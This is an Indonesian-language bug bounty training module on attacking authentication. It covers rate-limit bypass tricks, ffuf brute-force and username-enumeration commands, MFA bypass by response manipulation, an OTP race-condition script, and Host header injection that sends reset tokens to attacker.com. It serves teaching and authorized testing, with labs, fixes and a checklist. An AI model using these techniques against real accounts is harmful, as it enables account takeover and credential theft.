# Sesi 06 — Broken Authentication & Session Management

> **Level:** Intermediate  
> **Durasi Estimasi:** 4–5 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP Fundamentals), Sesi 07 (IDOR)  
> **Tools:** Burp Suite, Hydra, ffuf, Browser DevTools

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Mengidentifikasi dan exploit brute force dengan proteksi lemah
- Menemukan dan bypass MFA (Multi-Factor Authentication)
- Menganalisis dan exploit password reset flaws
- Mengidentifikasi session fixation dan session hijacking
- Chain beberapa auth bug menjadi full Account Takeover (ATO)
- Menulis laporan auth bug yang menjelaskan impact ATO dengan jelas

---

## 📚 Bagian 1 — Peta Serangan Authentication

```
Authentication Attack Surface:

┌─────────────────────────────────────────────────────┐
│                  LOGIN FLOW                          │
├──────────────┬──────────────┬───────────────────────┤
│  Brute Force  │  MFA Bypass  │  Session Management   │
│  Rate Limit  │  OTP Reuse   │  Fixation             │
│  Lockout     │  Response    │  Token in URL         │
│  Bypass      │  Manip.      │  Logout Invalidation  │
└──────────────┴──────────────┴───────────────────────┘

┌─────────────────────────────────────────────────────┐
│               PASSWORD RESET FLOW                    │
├──────────────┬──────────────┬───────────────────────┤
│  Token       │  Host Header │  Token Lifetime       │
│  Predictable │  Injection   │  Reuse                │
│              │              │  Email Normalization  │
└──────────────┴──────────────┴───────────────────────┘
```

---

## 📚 Bagian 2 — Brute Force & Rate Limit Bypass

### 2.1 Identifikasi Login Endpoint yang Rentan

```
Yang perlu diperiksa:
1. Apakah ada rate limiting? (percobaan ke-X → blocked?)
2. Apakah ada account lockout?
3. Apakah CAPTCHA bisa di-bypass?
4. Apakah error message berbeda untuk username valid vs invalid?
```

### 2.2 Teknik Bypass Rate Limit

```http
# Teknik 1: Null byte / whitespace padding password
POST /api/login HTTP/1.1
{"username": "victim@email.com", "password": "guess1"}
{"username": "victim@email.com", "password": "guess2 "}   ← spasi trailing
{"username": "victim@email.com", "password": "guess3\n"}  ← newline
{"username": "victim@email.com", "password": " guess4"}   ← spasi leading

# Teknik 2: X-Forwarded-For rotation
X-Forwarded-For: 1.1.1.1   → coba 10x
X-Forwarded-For: 1.1.1.2   → coba 10x lagi (reset rate limit)
X-Forwarded-For: 1.1.1.3   → dst.

# Teknik 3: Username variation (jika filter per-username)
victim@email.com → 10x
VICTIM@email.com → 10x lagi (case insensitive, tapi dianggap berbeda)
victim+1@email.com → 10x lagi (email aliasing)

# Teknik 4: Parameter pollution
{"username": "victim", "username": "victim", "password": "guess"}

# Teknik 5: Endpoint alternatif
/login → rate limited
/api/v1/auth/login → mungkin tidak rate limited
/api/v2/login → mungkin tidak rate limited
```

### 2.3 Brute Force dengan Burp Intruder

```
1. Proxy → tangkap POST /login
2. Send to Intruder
3. Mark §password§ sebagai payload position
4. Payload: Simple List → load password list
   (Rekomendasi: SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt)
5. Options → Grep Extract → tambahkan "error", "invalid", "success"
6. Start Attack → filter berdasarkan response length atau status code
```

### 2.4 Brute Force dengan ffuf

```bash
# Username enumeration dulu (cek apakah error berbeda)
ffuf -w usernames.txt -X POST \
     -d '{"username":"FUZZ","password":"wrongpass"}' \
     -H "Content-Type: application/json" \
     -u https://target.com/api/login \
     -mr "Invalid password"   # hanya match jika username VALID

# Password bruteforce setelah dapat valid username
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
     -X POST \
     -d '{"username":"victim@email.com","password":"FUZZ"}' \
     -H "Content-Type: application/json" \
     -u https://target.com/api/login \
     -mr "success"
```

---

## 📚 Bagian 3 — MFA Bypass

### 3.1 Response Manipulation

```
Teknik paling sederhana — ubah response dari server.

Skenario:
1. Login dengan credentials valid
2. Server minta OTP
3. Masukkan OTP salah
4. Intercept response dengan Burp

Response saat OTP salah:
{"success": false, "message": "Invalid OTP"}

Ubah response menjadi:
{"success": true, "message": "Login successful"}

Forward → kadang server percaya dan buat session!
```

### 3.2 OTP Reuse

```
Test apakah OTP bisa digunakan lebih dari sekali:

1. Request OTP #1
2. Gunakan OTP #1 → login berhasil
3. LOGOUT
4. Login lagi → request OTP #2
5. Coba gunakan OTP #1 yang lama

Jika berhasil → OTP tidak di-invalidasi setelah digunakan
```

### 3.3 Race Condition pada OTP Validation

```python
# Kirim request validasi OTP secara paralel
# Kadang jika dua request tiba bersamaan, satu bisa lolos
import threading
import requests

def try_otp(otp):
    r = requests.post('https://target.com/api/verify-otp', 
                      json={'otp': otp, 'session': 'xxx'})
    print(f"OTP {otp}: {r.status_code} - {r.text}")

# Kirim beberapa request bersamaan
threads = [threading.Thread(target=try_otp, args=(f'{i:06d}',)) 
           for i in range(0, 10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 3.4 Backup Code Abuse

```
Test backup/recovery codes:

1. Generate backup codes di settings
2. Catat semua backup codes
3. Coba apakah backup code bisa digunakan berkali-kali
4. Coba apakah backup code memiliki format prediktable
5. Coba apakah backup code di-expire setelah password reset
```

### 3.5 Skip MFA via Direct API Call

```http
# Normal flow:
POST /api/login → dapat "mfa_token" (sesi sementara)
POST /api/verify-mfa → dapat "auth_token" (sesi penuh)

# Bypass: langsung gunakan mfa_token untuk aksi yang butuh auth_token
GET /api/dashboard HTTP/1.1
Authorization: Bearer [MFA_TOKEN]  ← harusnya belum bisa akses!

# Atau: skip endpoint verify-mfa dan langsung request protected resource
```

---

## 📚 Bagian 4 — Password Reset Vulnerabilities

### 4.1 Token Predictability

```bash
# Collect beberapa reset token milik akun sendiri
# Token 1: 8f3b2a1c
# Token 2: 8f3b2a1d  ← increment by 1!
# Token 3: 8f3b2a1e

# Jika sequential/incremental → brute force token korban
# Gunakan Burp Intruder dengan payload list sequential numbers

# Atau cek format token:
# Base64? Decode → timestamp + user_id
# Hex? Cek apakah ada timestamp
# UUID v1? → time-based, bisa dikira-kira
```

### 4.2 Host Header Injection di Password Reset

```http
# Normal request reset password
POST /api/reset-password HTTP/1.1
Host: target.com
Content-Type: application/json

{"email": "victim@email.com"}

# Email yang dikirim ke victim:
# "Click to reset: https://target.com/reset?token=abc123"

# ATTACK: ubah Host header
POST /api/reset-password HTTP/1.1
Host: attacker.com    ← ubah ini!
Content-Type: application/json

{"email": "victim@email.com"}

# Jika server menggunakan Host header untuk generate link:
# Email yang dikirim ke victim:
# "Click to reset: https://attacker.com/reset?token=abc123"
# → Token dikirim ke server attacker!
```

### 4.3 Token Tidak Kedaluwarsa

```
Test token expiry:

1. Request reset password → dapat token
2. JANGAN gunakan token
3. Tunggu 24 jam, 48 jam, 1 minggu
4. Gunakan token lama
5. Jika masih bisa → token tidak expire → bug!

Juga test: apakah request reset baru membatalkan token lama?
1. Request reset #1 → token_A
2. Request reset #2 → token_B
3. Coba gunakan token_A
4. Jika masih valid → token tidak di-invalidasi → bug!
```

### 4.4 Password Reset via Token di Referer Header

```http
# User klik link reset password di email:
# https://target.com/reset?token=SECRET_TOKEN

# Di halaman reset, ada link ke third-party (misal: Google Analytics)
# Browser mengirim Referer header ke third-party:
# Referer: https://target.com/reset?token=SECRET_TOKEN

# Attacker yang punya akses ke Google Analytics data bisa lihat token!
```

### 4.5 Email Normalization Issues

```
Test dengan variasi email:
- victim@gmail.com      ← email asli
- VICTIM@gmail.com      ← uppercase → dikirim ke email yang sama?
- victim+test@gmail.com ← Gmail alias → valid tapi dianggap beda akun?
- victim @gmail.com     ← spasi → mana yang dipakai server?

Bug: Jika server mengirim reset ke victim+test@gmail.com (yang kontrolnya attacker)
     tapi melakukan reset pada akun victim@gmail.com
```

---

## 📚 Bagian 5 — Session Management Vulnerabilities

### 5.1 Session Fixation

```
Konsep: Attacker set session ID sebelum korban login

Alur:
1. Attacker akses target → dapat session ID: SESSION_ID=abc123
2. Attacker kirim link ke victim:
   https://target.com/login?SESSIONID=abc123
3. Victim login dengan session ID yang sudah di-set attacker
4. Server menggunakan SESSION_ID yang sama setelah login
5. Attacker gunakan SESSION_ID=abc123 → sudah terauthentikasi!

Test:
1. Ambil session ID sebelum login
2. Login → cek apakah session ID berubah
3. Jika TIDAK berubah → session fixation bug!
```

### 5.2 Session Token di URL

```http
# Token di URL → bocor ke Referer, server log, browser history
GET /dashboard?token=abc123secret HTTP/1.1
Referer: https://partner.com/page

# Saat redirect ke halaman partner:
Referer: https://target.com/dashboard?token=abc123secret
← Token bocor ke partner via Referer!
```

### 5.3 Session Tidak Di-invalidasi Setelah Logout

```
Test:
1. Login → ambil session cookie
2. Logout
3. Kirim request dengan session cookie lama (via Burp Repeater)
4. Jika masih 200 OK → session tidak di-invalidasi → bug!

Juga test:
- Session tidak di-invalidasi setelah password change
- Session tidak di-invalidasi setelah MFA disable
- Session tidak di-invalidasi setelah akun disable
```

### 5.4 Analisis Entropi Token

```python
# Script Python sederhana untuk cek pola token
import base64
import json
from datetime import datetime

tokens = [
    "dXNlcl8xMzM3XzE3MDAwMDAwMDA=",
    "dXNlcl8xMzM3XzE3MDAwMDAwMDE=",
    "dXNlcl8xMzM3XzE3MDAwMDAwMDI="
]

for token in tokens:
    try:
        decoded = base64.b64decode(token).decode()
        print(f"Decoded: {decoded}")
        # Output: user_1337_1700000000 → timestamp + user_id = PREDICTABLE!
    except:
        pass
```

---

## 📚 Bagian 6 — Chaining Auth Bugs ke Full ATO

### 6.1 Chain: Password Reset Token Leak → ATO

```
1. Target: victim@email.com
2. Attacker trigger password reset
3. Exploit: Host Header Injection → token dikirim ke attacker.com
4. Attacker dapat token
5. Attacker reset password → FULL ATO
```

### 6.2 Chain: Username Enumeration + Weak OTP + Rate Limit Bypass

```
1. Enumerate valid usernames via timing attack / error message
2. Target user tertentu dengan OTP 6 digit (1.000.000 kombinasi)
3. Bypass rate limit via X-Forwarded-For rotation
4. Brute force OTP
5. FULL ATO
```

### 6.3 Chain: Session Fixation + Social Engineering

```
1. Attacker dapat session ID valid (unauthenticated)
2. Kirim phishing ke victim dengan link yang mengandung session ID
3. Victim login via link tersebut
4. Attacker sudah authenticated dengan session ID yang sama
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — Password Reset Token Tidak Expire (HackerOne Pattern)

> **Platform:** HackerOne (Pola dari banyak disclosed reports)  
> **Severity:** High (P2)

**Skenario:**
Peneliti menemukan bahwa token reset password pada aplikasi SaaS besar tidak memiliki expiry time. Token yang di-generate satu bulan lalu masih bisa digunakan.

```http
# Token yang di-generate pada Jan 2024
POST /api/reset-password HTTP/1.1
{"token": "a3f9b2c1d4e5f6g7", "new_password": "NewPass123!"}

# Digunakan pada Maret 2024
HTTP/1.1 200 OK
{"message": "Password successfully reset"}  ← masih berhasil!
```

**Scenario Attack:** Jika attacker mendapatkan akses ke email korban sesaat (misal, via email phishing), mengambil token reset, kemudian kehilangan akses email — attacker masih bisa gunakan token tersebut sebulan kemudian.

**Fix:** Token reset harus kedaluwarsa dalam 15–60 menit.

---

### Case 2 — MFA Bypass via Response Manipulation (Real Pattern)

> **Referensi:** Pola yang sering muncul di HackerOne & Bugcrowd disclosed reports  
> **Severity:** Critical

**Detail:**
Pada beberapa implementasi MFA yang buruk, server melakukan validasi di sisi client berdasarkan response. Peneliti menemukan endpoint `/api/verify-2fa` yang mengembalikan `{"success": false}` ketika OTP salah. Dengan memodifikasi response di Burp menjadi `{"success": true}`, server menerima sesi sebagai authenticated.

**Mengapa ini terjadi:** Developer melakukan validasi di frontend JavaScript yang mengecek response body, bukan status code server-side session.

---

### Case 3 — Host Header Injection di Password Reset (Real — Disclosed)

> **Platform:** HackerOne — Multiple Programs  
> **Referensi:** [James Kettle - Practical HTTP Host Header Attacks](https://portswigger.net/research/practical-http-host-header-attacks)  
> **Severity:** High

**Proof of Concept:**
```http
POST /user/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Email yang diterima victim:**
```
Subject: Password Reset Request

Click here to reset your password:
https://attacker.com/reset?token=abc123secret

(Token dikontrol attacker!)
```

**Fix:** Gunakan hardcoded base URL dari konfigurasi server, bukan dari Host header.

---

### Case 4 — Account Takeover via Username Case Sensitivity (Real Pattern)

> **Tipe:** Auth Logic Flaw  
> **Inspirasi:** Pola dari beberapa reports di HackerOne tentang email normalization  
> **Severity:** High

```
Skenario:
1. Victim memiliki akun: victim@gmail.com
2. Attacker daftar akun baru dengan: VICTIM@GMAIL.COM
3. Attacker request password reset untuk VICTIM@GMAIL.COM
4. Server normalize email → kirim token ke victim@gmail.com (pemilik asli)
   TAPI melakukan reset pada akun attacker
5. Attacker set password → akun victim@gmail.com sekarang dikontrol attacker

Atau versi terbalik:
1. Attacker daftar akun dengan: victim@gmail.com (sudah ada)
   → Server tolak "email sudah digunakan"
2. Attacker daftar dengan: victim+hacked@gmail.com
   → Email diterima oleh victim@gmail.com (Gmail alias)
   → Tapi server treat sebagai akun berbeda
3. Attacker request fitur merge/link account
```

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy Authentication Labs (Gratis)
- 🔗 [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
- 🔗 [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
- 🔗 [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
- 🔗 [All Authentication Labs](https://portswigger.net/web-security/authentication)

### Lab 2 — TryHackMe
- 🔗 [Authentication Bypass](https://tryhackme.com/room/authenticationbypass)
- 🔗 [OWASP Broken Auth Room](https://tryhackme.com/room/owasptop10)

### Lab 3 — HackTheBox Academy
- 🔗 [Broken Authentication Module](https://academy.hackthebox.com/module/details/80)

### Lab 4 — DVWA
```bash
docker run -p 80:80 vulnerables/web-dvwa
# Modul: Brute Force, CSRF
```

---

## 📋 Authentication Testing Checklist

```markdown
## Auth Testing Checklist untuk [TARGET]

### Login Endpoint
- [ ] Error message berbeda untuk username valid vs invalid?
- [ ] Rate limit ada? Berapa threshold?
- [ ] Bypass rate limit: X-Forwarded-For rotation
- [ ] Bypass rate limit: null byte padding
- [ ] Account lockout: permanen atau sementara?
- [ ] CAPTCHA bypass possible?

### MFA / 2FA
- [ ] Response manipulation (ubah false → true)
- [ ] OTP reuse setelah logout-login ulang
- [ ] OTP brute force (6 digit = 1M kombinasi)
- [ ] Backup codes bisa digunakan berkali-kali?
- [ ] Skip MFA dengan direct API call?
- [ ] Race condition pada OTP validation?

### Password Reset
- [ ] Token format: predictable / sequential?
- [ ] Token expire setelah penggunaan?
- [ ] Token expire setelah waktu tertentu?
- [ ] Host Header Injection → token leak?
- [ ] Token tidak di-invalidasi saat reset baru dibuat?
- [ ] Token bocor di Referer header?
- [ ] Email normalization issues?

### Session Management
- [ ] Session ID berubah setelah login? (fixation)
- [ ] Session valid setelah logout?
- [ ] Session valid setelah password change?
- [ ] Token di URL? (Referer leak)
- [ ] Token entropi: random? Predictable?
- [ ] Cookie flags: HttpOnly, Secure, SameSite?
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| PortSwigger | [Authentication Attacks](https://portswigger.net/web-security/authentication) | Complete auth testing |
| OWASP | [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) | Best practices |
| OWASP | [Testing Authentication](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/) | Testing guide |
| James Kettle | [Practical HTTP Host Header Attacks](https://portswigger.net/research/practical-http-host-header-attacks) | Host Header Injection |
| HackerOne | [Hacktivity Auth Reports](https://hackerone.com/hacktivity?querystring=authentication) | Real reports |

---

## 🔑 Key Takeaways

1. **ATO = bounty tertinggi** — program besar bayar $1,000–$15,000+ untuk full ATO
2. **MFA bukan silver bullet** — bypass via response manipulation adalah bug valid
3. **Password reset adalah attack surface kritis** — Host Header Injection sering terlewat
4. **Session lifecycle harus diuji penuh** — bukan hanya saat login, tapi juga logout, change password, dan time-based expiry
5. **Chain bugs untuk maximum impact** — 3 bug individual P4 bisa chain menjadi P1 ATO

---

*Sesi berikutnya: **Sesi 22 — API Security (REST & GraphQL)***
